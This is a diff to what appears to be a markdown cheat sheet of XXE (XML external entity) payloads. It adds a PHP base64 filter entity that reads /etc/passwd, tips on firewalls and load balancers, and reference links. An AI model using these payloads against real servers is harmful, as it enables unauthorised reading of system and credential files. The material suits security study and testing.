@@ -1,5 +1,6 @@
 # Payloads:
 
+
 #### Simple Example
 
 ```
@@ -86,6 +87,20 @@ In the case where the web server displays an error, try to dump contents using t
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ```
 
+### PHP Exfil via base64
+
+```
+# Ref: http://www.informit.com/articles/article.aspx?p=24992&seqNum=5
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
+```
+
+# Caveats / Gotchas
+
+* Sometimes servers are behind firewalls, so send requests on port 80 by default [1]
+* Linefeeds & special characters get in the way, request:
+  * `/etc/hostname` [1]
+* Load balancers can send different responses [1]
+
 # Useful Links:
 
 * Definitions:
@@ -107,4 +122,8 @@ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 * XPath Injection
 * NDATA - how does this work?
 * Modify Content-Type header: `Content-Type: application/xml`
-* Exfil via encoding / base64?
+* Notation -> http://www.informit.com/articles/article.aspx?p=24992&seqNum=5
+
+# References
+
+* [1](https://web-in-security.blogspot.ca/2014/11/detecting-and-exploiting-xxe-in-saml.html)
